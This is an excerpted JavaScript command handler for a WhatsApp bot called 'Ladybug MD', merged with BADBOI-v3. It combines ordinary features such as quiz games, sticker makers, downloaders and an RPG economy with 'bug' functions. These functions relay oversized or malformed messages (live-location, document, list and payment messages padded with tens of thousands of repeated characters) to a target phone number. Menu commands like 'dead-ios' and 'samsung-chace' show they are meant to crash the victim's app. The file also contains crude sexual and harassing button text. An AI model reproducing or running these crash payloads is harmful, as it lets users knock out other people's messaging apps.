...
// Load TKM extra commands plugin
const tkmPlugin = require('./plugins/tkm-cmds')

// ============================================================
//  🐞 LADYBUG MD — Command Handler
//  Combined from TKM-bot + BADBOI-v3
//  All commands active
// ============================================================

/*
> Created By DEVIL BADBOI
...
// Group
const groupMetadata = m.isGroup ? await Ladybug.groupMetadata(m.chat).catch(e => {}) : ''
...
await Ladybug.readMessages([readkey]);
}
Ladybug.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
Ladybug.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
Ladybug.sendPresenceUpdate('recording', m.chat)
}
}
...
await Ladybug.updateProfileStatus(`✳️ BadboiXV - Client By : DEV BADBOI || ✅ Runtime : ${uptime}`)
...
if (m.message) {
Ladybug.sendPresenceUpdate(jd, m.chat)
}
*/
//=================================================//
...
await Ladybug.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
...
await Ladybug.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
...
let { key } = await Ladybug.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < gen2.length; i++) {
await sleep(10)
await Ladybug.sendMessage(m.chat, {text: gen2[i], edit: key });
}
}
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜VINOR KING⭐️᜴ # ˢᵃᵐˢཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
let gclink = (`https://chat.whatsapp.com/`+await Ladybug.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return Ladybug.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return Ladybug.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isDeveloper) return Ladybug.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
...
/*Ladybug.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Ladybug.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
...
await Ladybug.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
...
await Ladybug.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakgambar[m.sender.split('@')[0]]
...
await Ladybug.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksusunkata[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktekateki[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklagu[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkata[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklirik[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
await Ladybug.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else joreply('*Jawaban Salah!*')
}
...
if (room.x !== room.o) Ladybug.sendText(room.x, str, m, {
mentions: parseMention(str)
})
Ladybug.sendText(room.o, str, m, {
mentions: parseMention(str)
})
if (isTie || isWin) {
...
Ladybug.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
}
}
...
Ladybug.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
...
Ladybug.sendText(m.chat, `Suit telah dikirimkan ke chat
...
if (!roof.pilih) Ladybug.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) Ladybug.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) Ladybug.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
Ladybug.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
...
if (!roof.pilih2) Ladybug.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
joreply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) Ladybug.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
...
Ladybug.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
...
{
headers: { Authorization: "Bearer process.env.HF_TOKEN || "YOUR_HUGGINGFACE_TOKEN"" },
method: "POST",
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜VINOR KING⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
await Ladybug.relayMessage(target, etc.message, { messageId: etc.key.id })
}
//=================================================//
async function aipong(target) {
await Ladybug.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `✳️᜴࿆͆̿᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5⭑ ☠️⃰͜͡؜VINOR KING⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await Ladybug.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
...
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: Ladybug.waUploadToServer }))
      },
      body: {
        text: ""
      },
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜VINOR KING⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜VINOR KING⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
◈ Type : Case
◈ Status : Ready
◈ Mode : ${Ladybug.public ? '✱ Public ༣' : '✲ Self ༣'}
...
"newsletterName": 'By Badboi Execution Vault',
"serverMessageId": 1
},
},
"header": {
"title": penisbengkok,
...(await prepareWAMessageMedia({ image : mengkece }, { upload: Ladybug.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
...
Ladybug.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
Ladybug.relayMessage(m.chat, freesex, {})
}
...
👋 ${prefix}Addprem 23##/TAG 30d
👋 ${prefix}Dellprem 23##/TAG 30d
👋 ${prefix}addowner 2348####
👋 ${prefix}delowner 2348####
...
🤖 ${prefix}glitchtext badboi
🤖 ${prefix}writetext badboi
🤖 ${prefix}advancedglow badboi
🤖 ${prefix}typographytext badboi
🤖 ${prefix}pixelglitch badboi
🤖 ${prefix}neonglitch badboi
🤖 ${prefix}flagtext badboi
🤖 ${prefix}flag3dtext badboi
🤖 ${prefix}deletingtext badboi
🤖 ${prefix}blackpinkstyle badboi
🤖 ${prefix}glowingtext badboi
🤖 ${prefix}underwatertext badboi
🤖 ${prefix}logomaker badboi
🤖 ${prefix}cartoonstyle badboi
🤖 ${prefix}papercutstyle badboi
🤖 ${prefix}watercolortext badboi
🤖 ${prefix}effectclouds badboi
🤖 ${prefix}blackpinklogo badboi
🤖 ${prefix}gradienttext badboi
🤖 ${prefix}summerbeach badboi
🤖 ${prefix}luxurygold badboi
🤖 ${prefix}multicoloredneon badboi
🤖 ${prefix}sandsummer badboi
🤖 ${prefix}galaxywallpaper badboi
🤖 ${prefix}1917style badboi
🤖 ${prefix}makingneon badboi
🤖 ${prefix}royaltext badboi
🤖 ${prefix}freecreate badboi
🤖 ${prefix}galaxystyle badboi
🤖 ${prefix}lighteffects badboi
...
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"𝕭𝕬𝕯𝕭𝕺𝕴-𝓿3\nI LIKE YOUR BOOL HOLE, LET'S FUCK IT😋😘\",\"id\":\".terkentod\"}"
}
],
"messageParamsJson": ""
}
...
Ladybug.relayMessage(m.chat, msg, {})
}
}
break
//=================================================//
...
◈ ${prefix}ma-gic 2348###
◈ ${prefix}sor-ry 2348###
◈ ${prefix}bug-penis 2348###
◈ ${prefix}suck-it 2348###
◈ ${prefix}bug-24j 2348###
◈ ${prefix}brutal-bug 2348###
◈ ${prefix}samsung-chace 2348###
◈ ${prefix}samsun 2348###
◈ ${prefix}vios-unli 2348###
◈ ${prefix}dead-ios 2348###
◈ ${prefix}ios-try 2348#|amount
◈ ${prefix}bug-ios 2348#|amount

 ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂

꙲𝓑𝓐𝓓𝓑𝓞𝓘-V3  . © Copyright
 ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂`
let msg = {
viewOnceMessage: {
message: {
...
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"⿻BADBOI⿻\nI think You are a gay😋😘\",\"id\":\".terkentod\"}"
}
],
"messageParamsJson": ""
}
...
penis = fs.readFileSync("./Ladybug.js").toString(),
...
//=================================================//
case 'sc': case 'script': {
joreply(`🌤𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐑𝐄𝐀𝐋𝐋𝐘 𝐍𝐄𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐂𝐑𝐈𝐏𝐓 BASTARD.

❕𝐎𝐖𝐍𝐄𝐑 : https://api.whatsapp.com/send?phone=+2348140825959
❗𝐒𝐂𝐑𝐈𝐏𝐓: https://github.com/BADBOI-v1/BADBOI-v3
...
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝓑𝓐𝓓𝓑𝓞𝓘-V3 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝓑𝓐𝓓𝓑𝓞𝓘-V3 ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
Ladybug.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break
//=================================================//
case 'assalamualaikum': {
Ladybug.sendMessage(m.chat, { text: `waalaikumsalam`}, { quoted: m })
}
break
//=================================================//
case 'runtime':
                let pinga = ` ◈ ━━━━━━━ ⸙ 𝓑𝓐𝓓𝓑𝓞𝓘-V3  ⸙ ━━━━━━━ ◈𝖗 Is Active${runtime(process.uptime())}`
                Ladybug.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: `𝓑𝓐𝓓𝓑𝓞𝓘-V3`,
                            body: `𝓑𝓐𝓓𝓑𝓞𝓘`,
                            thumbnailUrl: 'https://telegra.ph/file/bcd13c42979bc13472b56.jpg',
                            sourceUrl: 'https://chat.whatsapp.com/LYOPu85NAVv4ymxOxCxRQY',
                            mediaType: 1,
...
case 'ping': {
  ...
  const pingMsg = await Ladybug.sendMessage(m.chat, { text: '*𝕭𝕬𝕯𝕭𝕺𝕴-𝓿3*' });

 await Ladybug.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `*badboi ν3 𝚂𝙿𝙴𝙴𝙳 ➟* *${new Date() - startTime}* 𝙼𝚂`
        }
      }
    }, {});
  } 
...
Ladybug.sendMessage(m.chat, { text: `kenapa?`}, { quoted: ryobug })
}
break
...
const audiovn = "./Alive.mp3";
    const dooc = {
        ...
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "Call Me badboi ν3",
          body: "https://chat.whatsapp.com/LYOPu85NAVv4ymxOxCxRQY",
          thumbnailUrl: "badboi ν3",
          sourceUrl: "https://chat.whatsapp.com/LYOPu85NAVv4ymxOxCxRQY",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
...
await Ladybug.sendMessage(m.chat, dooc, {quoted: m});
...
var name = await Ladybug.getName(q)
}
joreply(name)
} else {
joreply(m.pushName)
...
if (Input) {
try {
var ppWong = await Ladybug.profilePictureUrl(Input, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
Ladybug.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await Ladybug.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
Ladybug.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
...
await Ladybug.groupAcceptInvite(result).then((res) => joreply(jsonformat(res))).catch((err) => joreply(jsonformat(err)))
}
break
//=================================================//
case 'self': {
...
await Ladybug.updateBlockStatus(woke, "block")
} else if(!q){
...
if(woke.startsWith("08")) return joreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return joreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await Ladybug.updateBlockStatus(woke, "unblock")
...
//=================================================//
case 'listblock':{
let block = await Ladybug.fetchBlocklist()
...
if (!isDeveloper) return joreply(mess.owner);
if(m.quoted){
const media = await Ladybug.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await Ladybug.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
...
case 'delppbot': {
if (!isDeveloper) return joreply(mess.owner);
Ladybug.removeProfilePicture(Ladybug.user.id)
joreply(mess.succes)
}
break
//=================================================//
...
await Ladybug.updateProfileStatus(q)
...
let fileContent = fs.readFileSync("./Ladybug.js", "utf-8");
...
fs.writeFileSync("./Ladybug.js", fileContent, "utf-8");
...
//=================================================//
case 'iniryo' : {
Ladybug.sendMessage(m.chat, { text: `_Its ѕρι∂єя ν5_` }, { quoted: m })
}
break
//=================================================//
case 'terkentod' : {
Ladybug.sendMessage(m.chat, { text: `Call me ѕρι∂єя ν5` }, { quoted: m })
}
break
//=================================================//
case "emojimix": {
...
let encmedia = await Ladybug.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
...
for (let res of anu.results) {
let encmedia = await Ladybug.sendImageAsSticker(m.chat, res.url, m, { packname: pushname, author: author, categories: res.tags })
await fs.unlinkSync(encmedia);
}
}
break
...
let encmedia = await Ladybug.sendImageAsSticker(m.chat, media, m, {
...
let media = await quoted.download()
let encmedia = await Ladybug.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
...
let dwnld = await Ladybug.downloadAndSaveMediaMessage(qmsg)
...
let pop = await Ladybug.sendImageAsSticker(m.chat, smeme, m, {
packname: global.packname,
author: global.author
})
fs.unlinkSync(pop)
...
joreply(mess.wait)
var media = await Ladybug.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
Ladybug.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: m })
...
joreply(mess.wait)
let media = await Ladybug.downloadMediaMessage(qmsg)
...
await Ladybug.sendVideoAsSticker(m.chat, lubangtile, m, {
packname: global.packname,
author: global.author
})
}
...
Ladybug.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m })
}
break
//=================================================//
...
Ladybug.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => joreply(err))
}   
break
//=================================================//
case 'mediafire': {
...
Ladybug.sendMessage(m.chat, { document: { url: hasdl }, fileName: namafile, mimetype: '*/*' }, { quoted: m })
}
break
//=================================================//
case 'igdlmp4': {
...
let teks = `*GENERATED By badboi ν3*`

Ladybug.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: false, 
title: `${res.title}`,
body: `${week} ${calender}`,
mediaType: 2,  
renderLargerThumbnail : true,
...
Ladybug.sendMessage(m.chat, { video: { url: anu.result.video }}, { quoted: m })
}
break
//=================================================//
case 'tiktokmp3':
...
Ladybug.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
//=================================================//
...
joreply(mess.wait)
if (/image/.test(mime)) {
let media = await Ladybug.downloadMediaMessage(quoted)
let encmedia = await Ladybug.sendImageAsSticker(m.chat, media, m, { packname: `${teks1 ? teks1 : global.packname}`, author: `${teks2 ? teks2 : global.author}`  })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return joreply('Maksimal 10 detik!')
let media = await Ladybug.downloadMediaMessage(qmsg)
let encmedia = await Ladybug.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
} else {
return joreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
...
await Ladybug.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{quoted: m})
 } catch (e) {
...
Ladybug.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
}
break
//=================================================//
case "prompt-gpt": {
...
Ladybug.sendMessage(m.chat, { image: { url: json.result[0].url }, caption: capt }, { quoted: m })
} else {
var capt = `❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}
🔎 Search : ${q}
Maaf, tidak ada hasil yang ditemukan.`
Ladybug.sendMessage(m.chat, capt, { quoted: m })
}
})
break
//=================================================//
...
`;
await Ladybug.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
//=================================================//
case 'search-sticker': {
...
await sleep(2000)
Ladybug.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
}
}
break
//=================================================//
...
joreply("Sukses Via Nomer")
await sleep(2000)
Ladybug.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
...
let cek1 = await Ladybug.onWhatsApp(prem1 + `@s.whatsapp.net`)
...
Ladybug.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qpay})
}
break
//=================================================//
case 'delowner': {
...
await sleep(3500)
Ladybug.sendMessage(prem1 + '@s.whatsapp.net', {
...
.then(({data}) => {
Ladybug.sendMessage(m.chat, { image: {url: data.url }, caption: '✅Succes, Tapi Lu jan ngaceng Woi' },{quoted: m })
})
}
break
//=================================================//
...
Ladybug.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
case 'shadow': 
...
Ladybug.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
...
Ladybug.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
//=================================================//
case 'kiss': {
...
await Ladybug.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await Ladybug.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Mencium @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'hug': {
...
let data = await mmk.json()
await Ladybug.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await Ladybug.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Memeluk @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'nebang': {
...
let buatall = 1
Ladybug.casino = Ladybug.casino ? Ladybug.casino : {}
if (m.chat in Ladybug.casino) return reply ('Masih ada yang melakukan casino disini, tunggu sampai selesai!!')
else Ladybug.casino[m.chat] = true
try {
...
joreply('Error!!')
if (DevMode) {
for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != Ladybug.user.jid)) {
Ladybug.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
}
}
} finally {
delete Ladybug.casino[m.chat]
}
}
break
//=================================================//
...
case 'bankcek': {
if (!isGroup) return joreply(mess.ingroup)
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? Ladybug.user.jid: m.sender
...
let caption = `
▧「 *BANK CEK* 」
│ 👤 Name: ${user.registered ? user.name: Ladybug.getName(m.sender)}
...
let timers = clockString(_timers)
let name = Ladybug.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Taxy'
Ladybug.misi = Ladybug.misi ? Ladybug.misi : {}
if (id in Ladybug.misi) {
joreply(`Selesaikan Misi ${Ladybug.misi[id][0]} Terlebih Dahulu`)
throw false
}
...
${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: Ladybug.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
...
Ladybug.misi = Ladybug.misi ? Ladybug.misi : {}
if (id in Ladybug.misi) {
return joreply( `Selesaikan Misi ${Ladybug.misi[id][0]} Terlebih Dahulu`)
 }
if (new Date - user.lastmisi > 3600000) {
...
let hsl = `🕸 *Hasil Berburu ${user.registered ? user.name : Ladybug.getName(m.sender)}* 
${hewan1 ? `
...
let username = Ladybug.getName(who)
...
let kerja = 'Berkebun'
let id = m.chat
.misi = Ladybug.misi ? Ladybug.misi : {}
if (id in Ladybug.misi) {
joreply(`Selesaikan Misi ${Ladybug.misi[id][0]} Terlebih Dahulu`)
return false
}
...
case 'fighting':
 case 'fight': {
 if (!isGroup) return joreply(mess.ingroup)
Ladybug.fight = Ladybug.fight ? Ladybug.fight: {}
let user = db.data.users[m.sender]
if (typeof Ladybug.fight[m.sender] != "undefined" && Ladybug.fight[m.sender] == true) return joreply(`Kamu masih bertarung.`)
...
joreply(`*Kamu* (level ${user.level}) menantang *${Ladybug.getName(lawan)}* (level ${db.data.users[lawan].level}) dan sedang dalam pertarungan.\n\nTunggu 5 menit lagi dan lihat siapa yg menang.`)
Ladybug.fight[m.sender] = true
await delay(300000)
let kesempatan = []
...
user.money += hadiah
user.limit += 1
joreply(`*${Ladybug.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Ladybug.getName(lawan)}*\n\n*Kamu* (level ${user.level}) menang melawan *${Ladybug.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nHadiah . ${hadiah.toLocaleString()}\n+1 Limit`)
} else if (pointPemain < pointLawan) {
let denda = (pointLawan - pointPemain) * 100000
user.money -= denda
user.limit += 1
joreply(`*${Ladybug.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Ladybug.getName(lawan)}*\n\n*Kamu* (level ${user.level}) kalah melawan *${Ladybug.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nMoney kamu berkurang ${denda.toLocaleString()}\n+1 Limit`)
} else {
joreply(`*${Ladybug.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Ladybug.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa`)
}
delete Ladybug.fight[m.sender]
}
break
//=================================================//
case 'gajian': {
...
let isMods = [Ladybug.decodeJid(Ladybug.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isDeveloper = m.fromMe || isMods || [Ladybug.decodeJid(Ladybug.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && !isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isPrems = isDeveloper || new Date() - user.premiumTime < 0
...
let caption = `
